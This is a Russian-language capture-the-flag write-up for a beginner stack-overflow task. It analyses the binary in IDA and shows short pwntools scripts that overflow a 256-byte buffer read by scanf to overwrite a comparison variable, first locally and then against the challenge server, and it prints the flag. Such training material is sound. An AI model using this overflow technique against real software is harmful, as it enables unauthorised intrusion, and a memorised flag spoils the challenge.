
# Сайт: forkbomb.ru
# Автор: @mrvos (Vlad Roskov) 
# Задание: Easy Overflow 1
# Сложность: Easy

Плавно подходим к четвертому заданию из серии MicCheck. В задании теперь не получится пропатчить память и сразу же получить флаг ибо мы должны отправлять свой ввод на удаленный сервер. Чтобы это сделать надо воспользоваться библеотекой, которая называется pwntools. 
Традиционно начинаем статически анализировать программу.

#### Статический анализ.

![image](https://github.com/user-attachments/assets/790fd5e8-767c-4a75-8aca-14f7551f1750)

В первом блоке программы заносим адрес строки `dword_4006A4` в переменную `giveflag`. По данному адресу лежит строка `No.` о чем нам любезно подсказывает IDA.

![image](https://github.com/user-attachments/assets/f681879a-c794-4192-beeb-fc25da34f2f0)

Ну и собственно сравнивается строка `giveflag` и `s2` с помощью функции `_strcmp` и прыгает в одну из двух веток: одна выводит "локальный флаг", а другая, что флаг нам не дадут. <br />
![image](https://github.com/user-attachments/assets/1803bb82-fdba-4db0-b016-92a71400d56a)
![image](https://github.com/user-attachments/assets/1477319a-d6b0-4d62-91e7-f1c27221065d)
![image](https://github.com/user-attachments/assets/2289ea6b-c081-42af-b2fb-97b714d7a4c9)

#### Решение

Приступим к решению задачи. У нас есть переменная `word` она занимает в памяти 256 байт и  `giveflag`, который занимает 4 байта. 
Выход за пределы массива не проверяется, а также используется небезопасная функция `scanf`, которая считывает данные пока не встретит нулевой байт. Все эти факторы неплохие условия
для того, чтобы переполнить массив `word` и перезаписать данные на стеке.

Получим информацию о бинарном файле с которым мы работаем:
```py
from pwn import *

p = ELF('./mc4_censored')
```

![image](https://github.com/user-attachments/assets/dd5d7fc8-a415-49a0-9e67-29d2ab92ef75)

Никаких защит не стоит, все замечательно, можно спокойно переполнять. Напишем следующий скрипт на языке python

```py
#!/usr/bin/env python3
from pwn import *


p = process('./mc4_censored')
pause()
p.sendline(b"A"*264 + b"Yesss!")
p.interactive()

```
 Данный скрипт заполняет полностью массив `word` и перезаписывает переменную `giveflag`. Проверим работу скрипта: 
 ![image](https://github.com/user-attachments/assets/e9528abd-343f-4b5f-98d0-9a4f8efaee69)

 Локальный флаг получен. Перепишем скрипт и получим настоящий флаг:
 
```py
#!/usr/bin/env python3
from pwn import *


p = remote('109.233.56.90', 11584)
p.sendline(b"A"*264 + b"Yesss!")
p.interactive()

```

![image](https://github.com/user-attachments/assets/a3bd7f15-37a7-457e-875a-42091c3f2a00)


Ответ: `spbctf{babys_f1rst_0verfl0ww}`

